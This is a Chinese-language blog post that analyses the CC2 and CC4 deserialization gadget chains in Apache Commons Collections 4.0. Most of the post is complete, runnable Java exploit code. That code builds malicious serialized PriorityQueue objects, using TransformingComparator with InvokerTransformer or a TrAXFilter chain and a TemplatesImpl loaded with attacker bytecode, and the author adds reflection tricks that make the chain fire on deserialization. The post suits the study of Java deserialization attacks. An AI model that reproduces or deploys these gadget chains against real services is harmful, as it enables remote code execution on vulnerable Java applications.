---
title: "PriorityQueue CC2&CC4"
onlyTitle: true
date: 2024-8-2 16:11:32
categories:
- java
- CC
tags:
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B894.png

---



CC2，4都是Common Collections 4.0版本下的反序列化漏洞。pom依赖：

```xml
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
```

## CC4

这个版本特点在于TransformingComparator脑瘫的加上了Serializable接口，并在readObject乱搞

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143255644.png)

chainedTransformer#transform()可以用TransformingComparator#compare触发

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143009550.png)

PriorityQueue#siftDownUsingComparator调用了compare

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143054560.png)

向上一直查找用法，在PriorityQueue#readObject能链上整条链

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802143133929.png)

于是有如下代码利用：

```java
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer,null);
    PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,transformingComparator);
    serialize(priorityQueue);
```

但是运行并没有成功利用，在heapify处打上断点

发现size=0，i初始值为-1，进不了for循环。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802144327398.png)

这里有两种方式解决

### 反射修改size

这里可以反射修改size

```java
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer,null);
PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,transformingComparator);
Field size = PriorityQueue.class.getDeclaredField("size");
size.setAccessible(true);
size.set(priorityQueue,2);
serialize(priorityQueue);
```

不过会报尝试访问数组中不存在的索引。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802145143841.png)

我是改字段大王。错误发生在序列化时，依次序列化queue数组元素，但越界读取，再反射修改queue就完事。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802145257303.png)

完整代码：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4PriorityQueue {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry2.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesClass}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer,null);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,transformingComparator);
        Field size = PriorityQueue.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue,2);
        Object[] array = new Object[]{1,2};
        Field queue = PriorityQueue.class.getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(priorityQueue,array);
        serialize(priorityQueue);
        unserialize("cc6.ser");
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

### add添加

也可以向queue add进元素，进而调用offer对size进行添加。

但是offer方法里的siftUp会再次调用到chainedTransformer。有点类似URLDNS了，需要add前添加不需要的comparator，add后再修改，防止误调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802144518621.png)

```java
		TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer,null);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,new TransformingComparator<>(new ConstantTransformer<>(1)));
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field compareField = PriorityQueue.class.getDeclaredField("comparator");
        compareField.setAccessible(true);
        compareField.set(priorityQueue,transformingComparator);
        serialize(priorityQueue);
```



完整代码：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4PriorityQueue {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry2.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesClass}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(chainedTransformer,null);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,new TransformingComparator<>(new ConstantTransformer<>(1)));
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field compareField = PriorityQueue.class.getDeclaredField("comparator");
        compareField.setAccessible(true);
        compareField.set(priorityQueue,transformingComparator);
        serialize(priorityQueue);
        unserialize("cc6.ser");
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

CC4特点在于没有特点。勉强说特点就是CC4.0版本能用，而且没用到LazyMap





## CC2

CC2特点在于去掉了Transformer数组，有些中间件，Shiro，Tomcat传数组可能会有传输问题。

不用Transformer数组，chainedTransformer也砍掉了。

CC2用到了TemplatesImpl#newTransformer方法，之前的CC3我们是用TrAXFilter构造函数去触发的newTransformer。

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesClass}),
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802152748715.png)

该文的完整代码1也给出了能直接InvokerTransformer调用newTransformer

https://godownio.github.io/2024/08/01/duo-lu-jing-templatesimpl-cc3/#%E7%9B%B4%E6%8E%A5%E8%A7%A6%E5%8F%91TemplatesImpl-newTransformer

但是当时不知道怎么向InvokerTransformer.transform传参数，只知道通过chainedTranfromer链式。

现在可以用TransformingComparator.compare触发transform方法，并且可以向transform传参。于是可以省去数组（其实我们不用这个，直接反射改InstantiateTransformer的值也能省去数组）

现在我们需要构造这个：

```java
InvokerTransformer.transform(TemplatesImpl)
```

用TransformingComparator.compare传参

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802155015810.png)

obj1，obj2来自下面函数的c，queue[right]。这是个堆排序算法。我们全传TemplatesImpl恶意字节码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802161235365.png)

完整代码：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\CC6TiedMapEntry2.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
        TransformingComparator transformingComparator = new TransformingComparator<>(invokerTransformer,null);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(1,new TransformingComparator<>(new ConstantTransformer<>(1)));
        priorityQueue.add(templatesClass);
        priorityQueue.add(templatesClass);
        Field compareField = PriorityQueue.class.getDeclaredField("comparator");
        compareField.setAccessible(true);
        compareField.set(priorityQueue,transformingComparator);
        serialize(priorityQueue);
        unserialize("cc6.ser");
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



ysoserial给出的链子用的toString先占位，避免误触发，我这里用的`new ConstantTransformer<>(1)`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802161006700.png)

其他的CC链懒得分析了，都一样。

其实不用刻意去记链子，分析完了都记不住的，很正常，需要的时候再去翻链子图，自己重新构造起来也很快。

